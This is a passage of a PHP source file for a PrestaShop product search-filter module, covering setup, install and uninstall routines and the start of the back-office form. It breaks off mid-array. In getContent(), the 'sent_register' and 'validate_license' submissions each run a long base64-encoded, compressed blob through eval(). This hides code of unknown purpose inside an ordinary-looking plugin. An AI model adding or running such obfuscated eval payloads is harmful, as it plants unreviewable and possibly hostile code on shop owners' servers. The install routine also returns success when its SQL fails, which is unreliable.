<?php
//i modif, added features autocomplete in product edit page, only for 1.5.4.1

if (_PS_VERSION_ > '1.3.1.1') {
    if (!defined('_CAN_LOAD_FILES_'))
        exit;
}

define('VAR_FILTERPRODUCTSPRO_EXITO', 0);
define('VAR_FILTERPRODUCTSPRO_ERROR', -1);

global $FilterProducts;
$FilterProducts = (object) array(
            'Positions' => (object) array(
                'Left' => 'LeftColumn',
                'Right' => 'RightColumn',
                'Top' => 'Top',
                'Home' => 'Home',
                'Custom' => 'Custom'
            ),
            'Types' => (object) array(
                'Select' => 'select',
                'Checkbox' => 'checkbox',
                'Button' => 'button',
                'Radio' => 'radio'
            ),
            'Criterions' => (object) array(
                'Category' => 'C',
                'Attribute' => 'A',
                'Feature' => 'F',
                'Manufacturer' => 'M',
                'Supplier' => 'S',
                'Price' => 'P',
                'Custom' => 'Ct'
            ),
            'ConditionsRangePrice' => (object) array(
                'Eq' => 'eq',
                'Lt' => 'lt',
                'Gt' => 'gt',
                'Bt' => 'bt'
            ),
            'TypeFilterCategory' => (object) array(
                'AllCategories' => '1',
                'OnlyCategories' => '2'
            )
);

class FilterProductsPro extends Module {

    private $_html = '';
    private $INSTALL_SQL_FILE = 'install.sql';
    private $UNINSTALL_SQL_FILE = 'uninstall.sql';
    //Definicion de constantes
    private $GLOBALS_SMARTY = array();
    private $GLOBAL = array();
    private $id_lang = 0;
    public $p = 0;
    public $n = 0;
    public $orderBy;
    public $orderWay;
    static $_dependencies = '';
    static $list_categories = '';
    
    public function __construct() {
        global $FilterProducts, $cookie;

        $this->name = 'filterproductspro';
        $this->tab = floatval(substr(_PS_VERSION_,0,3)) < 1.4 ? 'editorstefan' : 'search_filter';
        $this->version = '1.0';
        $this->author = 'editorstefan';
        $this->module_key = 'b2931684a287f6f8a61cbecab1a61b3e';

        $this->_errors = array();
        $this->warning = array();

        parent::__construct();

        $this->displayName = 'Search Filter';
        $this->description = $this->l('Search for car models and filter with attributes, features and coustom created.');
        $this->confirmUninstall = $this->l('Are you sure you want unistall ?');

        $this->id_lang = (int) $cookie->id_lang;

        //Asignacion de valores a constantes de servidor
        $this->GLOBAL = $FilterProducts;

        //Asingacion de valores a constantes smarty
        $this->GLOBALS_SMARTY = array(
            'POSITIONS' => array(
                'LeftColumn' => $this->l('Left Column'),
                'RightColumn' => $this->l('Right Column'),
                'Top' => $this->l('Top'),
                'Home' => $this->l('Home'),
                'Custom' => $this->l('Custom'),
            ),
            'CRITERIONS' => array(
                $this->GLOBAL->Criterions->Attribute => $this->l('Attribute'),
                $this->GLOBAL->Criterions->Category => $this->l('Category'),
                $this->GLOBAL->Criterions->Feature => $this->l('Feature'),
                $this->GLOBAL->Criterions->Manufacturer => $this->l('Manufacturer'),
                $this->GLOBAL->Criterions->Supplier => $this->l('Supplier'),
                $this->GLOBAL->Criterions->Price => $this->l('Price'),
                $this->GLOBAL->Criterions->Custom => $this->l('Custom'),
            ),
            'TYPES' => array(
                $this->GLOBAL->Types->Select => $this->l('List'),
                $this->GLOBAL->Types->Checkbox => $this->l('Checkbox'),
                $this->GLOBAL->Types->Button => $this->l('Button')
            ),
            'CONDITIONS_RANGE_PRICE' => array(
                $this->GLOBAL->ConditionsRangePrice->Eq => $this->l('Equals'),
                $this->GLOBAL->ConditionsRangePrice->Lt => $this->l('Less than'),
                $this->GLOBAL->ConditionsRangePrice->Gt => $this->l('Greater than'),
                $this->GLOBAL->ConditionsRangePrice->Bt => $this->l('Between')
            ),
            'TYPE_FILTER_CATEGORY' => array(
                $this->GLOBAL->TypeFilterCategory->AllCategories => $this->l('All categories except'),
                $this->GLOBAL->TypeFilterCategory->OnlyCategories => $this->l('Only the categories')
            )
        );

        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/OptionClass.php');
        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/FilterClass.php');
        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/SearcherClass.php');
        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/OptionCriterionClass.php');
        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/ColumnClass.php');
        require_once(_PS_MODULE_DIR_ . $this->name . '/classes/ColumnOptionClass.php');
        
        //update version
        $this->updateVersion();      
    }        

    function install() {
        /* INSTALLATION OF TABLES */
        if (!file_exists(dirname(__FILE__) . '/' . $this->INSTALL_SQL_FILE))
            return (false);
        else if (!$sql = file_get_contents(dirname(__FILE__) . '/' . $this->INSTALL_SQL_FILE))
            return (false);

        $sql = str_replace('PREFIX_', _DB_PREFIX_, $sql);
        $sql = preg_split("/;\s*[\r\n]+/", $sql);

        foreach ($sql as $query)
            if (!Db::getInstance()->Execute(trim($query)))
                return true;//FALSE; unknown error in sydneytruckparts.com?

        if (!parent::install() OR !$this->registerHook('rightColumn') OR !$this->registerHook('leftColumn') OR !$this->registerHook('header') 
                OR !$this->registerHook('top') OR !$this->registerHook('home') OR !$this->registerHook('filterProductsPro')
            )
            return FALSE;
        
        if(
            !Configuration::updateValue('FPP_DISPLAY_BACK_BUTTON_FILTERS', 0)
            OR !Configuration::updateValue('FPP_DISPLAY_EXPAND_BUTTON_OPTION',0)
            OR !Configuration::updateValue('FPP_ONLY_PRODUCTS_STOCK',0)
            OR !Configuration::updateValue('FPP_ID_CONTENT_RESULTS', '#center_column') //ID del contenedor donde mostrara el resultado de la busqueda.
            OR !Configuration::updateValue('FPP_VERSION', $this->version)
            OR !Configuration::updateValue('FPP_RM', false)
        )
            return FALSE;

		if (version_compare(_PS_VERSION_, '1.5.4.1') === 0)
			if (!$this->updateFeatureProductTable()
				or !$this->registerHook('backofficeTop')
				)
				return false;//i add

        $this->reindexCategories();
        OptionCriterionClass::indexFeatures();
        OptionCriterionClass::indexAttributes();
        OptionCriterionClass::indexManufacturers();
        OptionCriterionClass::indexSuppliers();
        
        return TRUE;
    }

    public function uninstall() {
        /* UNINSTALLATION OF TABLES */
        if (!file_exists(dirname(__FILE__) . '/' . $this->UNINSTALL_SQL_FILE)) {
            echo $this->l('Cannot find [uninstall.sql]! (aborted)');
            return (false);
        } else if (!$sql = file_get_contents(dirname(__FILE__) . '/' . $this->UNINSTALL_SQL_FILE)) {
            echo $this->l('Cannot open [uninstall.sql]! (aborted)');
            return (false);
        }                

        $sql = str_replace('PREFIX_', _DB_PREFIX_, $sql);
        $sql = preg_split("/;\s*[\r\n]+/", $sql);
        foreach ($sql as $query)
            if (!Db::getInstance()->Execute(trim($query))) {
                echo $this->l('Cannot remove FilterProductsPro table from database! (aborted)');
                return false;
            }
            
        Configuration::deleteByName('FPP_DISPLAY_BACK_BUTTON_FILTERS');
        Configuration::deleteByName('FPP_DISPLAY_EXPAND_BUTTON_OPTION');
        Configuration::deleteByName('FPP_ONLY_PRODUCTS_STOCK');
        Configuration::deleteByName('FPP_ID_CONTENT_RESULTS');
        Configuration::deleteByName('FPP_VERSION');

        if (!parent::uninstall())
            return false;
        return true;
    }

    public function getContent() {
        $this->_html = '<h2>' . $this->displayName . ' - v' . $this->version . '</h2>';

        if (Tools::isSubmit('submitSettings')) {
            if (!sizeof($this->_errors))
                $this->_html .= $this->displayConfirmation($this->l('Settings updated'));
        }elseif (Tools::isSubmit('sent_register')){
            eval(gzinflate(base64_decode("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")));                                         
        }elseif(Tools::isSubmit('validate_license')){
            eval(gzinflate(base64_decode("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")));
        }

        $this->displayErrors();
        $this->_displayForm();

        return $this->_html;
    }

    private function _displayForm() {
        global $smarty, $cookie;

        $this->getDependenciesFilters();

        $js_files = array(
            $this->_path . 'js/jquery-ui/jquery-1.7.1.min.js',
            $this->_path . 'js/jquery.cookie.js',
            $this->_path . 'js/jquery-ui/jquery-ui-1.8.18.custom.min.js',
            $this->_path . 'js/jquery.autocomplete.js',
            $this->_path . 'js/' . $this->name . '_back.js',
            $this->_path . 'js/jquery.blockUI.js',
        );
        
        if(version_compare(_PS_VERSION_, '1.5') >= 0){
            $js_files[] = _PS_JS_DIR_.'jquery/plugins/treeview-categories/jquery.treeview-categories.js';
			$js_files[] = _PS_JS_DIR_.'jquery/plugins/treeview-categories/jquery.treeview-categories.async.js';
			$js_files[] = _PS_JS_DIR_.'jquery/plugins/treeview-categories/jquery.treeview-categories.edit.js';
            $js_files[] = $this->_path . 'js/categories-tree-15.js';
        }else{
            $js_files[] = $this->_path . 'js/jquery.treeview.js';
			$js_files[] = $this->_path . 'js/jquery.treeview.edit.js';
			$js_files[] = $this->_path . 'js/jquery.treeview.async.js';
            $js_files[] = $this->_path . 'js/categories-tree.js';
        }
        
        $css_files = array(
            $this->_path . 'css/cupertino_fpp/jquery-ui-1.8.18.custom.css',
            $this->_path . 'css/jquery.autocomplete.css',
            $this->_path . 'css/jquery.treeview.css',
            $this->_path . 'css/' . $this->name . '_back.css'
        );
        
        if(version_compare(_PS_VERSION_, '1.5') >= 0)//si es version 1.5 borramos el jquery, ya que esta version trae el 1.7.2
            unset($js_files[0]);

        $defaultLanguage = intval(Configuration::get('PS_LANG_DEFAULT'));
        $languages = Language::getLanguages(false);

        //Obtener todos los searchers
        $searchers = SearcherClass::getSearchers($cookie->id_lang);

        //Obtener los niveles de categoria
        $levels_depth = FilterClass::getLevelsDepthCategory();

        //Obtener caracteristicas
        if(version_compare(_PS_VERSION_, '1.5') >= 0)
            $features = Feature::getFeatures($this->id_lang, FALSE);
        else
            $features = Feature::getFeatures($this->id_lang);

        //Obtener los grupos de atributos
        $attributes_group = AttributeGroup::getAttributesGroups($this->id_lang);

        //Obtener los rangos de precios
        $ranges_prices = $this->getRangesPriceByCondition();

        //Limite de columnas, en el parametro {end} sumar 1 para evitar errores en Smarty2
        $avaible_columns = array('start' => 1, 'end' => 7);

        //Obtener string de ids de las columnas para los flag de idiomas
        $ids_columns_value = htmlspecialchars('public_name¤filter_name¤option_custom_name');

        $html_columns_value = array();
        for ($i = $avaible_columns['start']; $i < $avaible_columns['end']; $i++) {
            $ids_columns_value .= htmlspecialchars('¤') . 'column_value_' . $i;
        }

        for ($i = $avaible_columns['start']; $i <= $avaible_columns['end']; $i++) {
            $html_columns_value[$i] = $this->displayFlags($languages, $defaultLanguage, htmlspecialchars($ids_columns_value), 'column_value_' . $i, true);
        }

        //Asignacion de varibles a tpl de administracion.
        $paramsBack = array(
            'FILTERPRODUCTSPRO_DIR_FULL' => dirname(__FILE__).'/',
            'FILTERPRODUCTSPRO_DIR' => $this->_path,
            'FILTERPRODUCTSPRO_IMG' => $this->_path . 'img/',
            'JS_FILES' => $js_files,
            'CSS_FILES' => $css_files,
            'DEFAULT_LENGUAGE' => $defaultLanguage,
            'LANGUAGES' => $languages,
            'FLAGS_INTERNAL_NAME' => $this->displayFlags($languages, $defaultLanguage, htmlspecialchars($ids_columns_value), 'public_name', true),
            'FLAGS_FILTER_NAME' => $this->displayFlags($languages, $defaultLanguage, htmlspecialchars($ids_columns_value), 'filter_name', true),
            'FLAGS_OPTION_CUSTOM_NAME' => $this->displayFlags($languages, $defaultLanguage, htmlspecialchars($ids_columns_value), 'option_custom_name', true),
            'ACTION_URL' => Tools::safeOutput($_SERVER['PHP_SELF']) . '?' . $_SERVER['QUERY_STRING'],
            'GLOBALS_SMARTY' => $this->GLOBALS_SMARTY,
            'GLOBALS' => $this->jsonEncode($this->GLOBAL),
            'SEARCHERS' => $searchers,
            'LEVELS_DEPTH' => $levels_depth,
            'FEATURES' => $features,
            'ATTRIBUTES_GROUP' => $attributes_group,
            'RANGES_PRICE' => $ranges_prices,
            'BETWEEN_COLUMNS' => $avaible_columns,
            'HTML_COLUMNS_VALUE' => $html_columns_value,
            'FILTERS_CUSTOM' => FilterClass::getFiltersByCriterion($cookie->id_lang, $this->GLOBAL->Criterions->Custom, NULL, 1),
            'FPP_DISPLAY_BACK_BUTTON_FILTERS' => (int)Configuration::get('FPP_DISPLAY_BACK_BUTTON_FILTERS'),
            'FPP_DISPLAY_EXPAND_BUTTON_OPTION' => (int)Configuration::get('FPP_DISPLAY_EXPAND_BUTTON_OPTION'),
            'FPP_ONLY_PRODUCTS_STOCK' => (int)Configuration::get('FPP_ONLY_PRODUCTS_STOCK'),
            'FPP_ID_CONTENT_RESULTS' => Configuration::get('FPP_ID_CONTENT_RESULTS'),
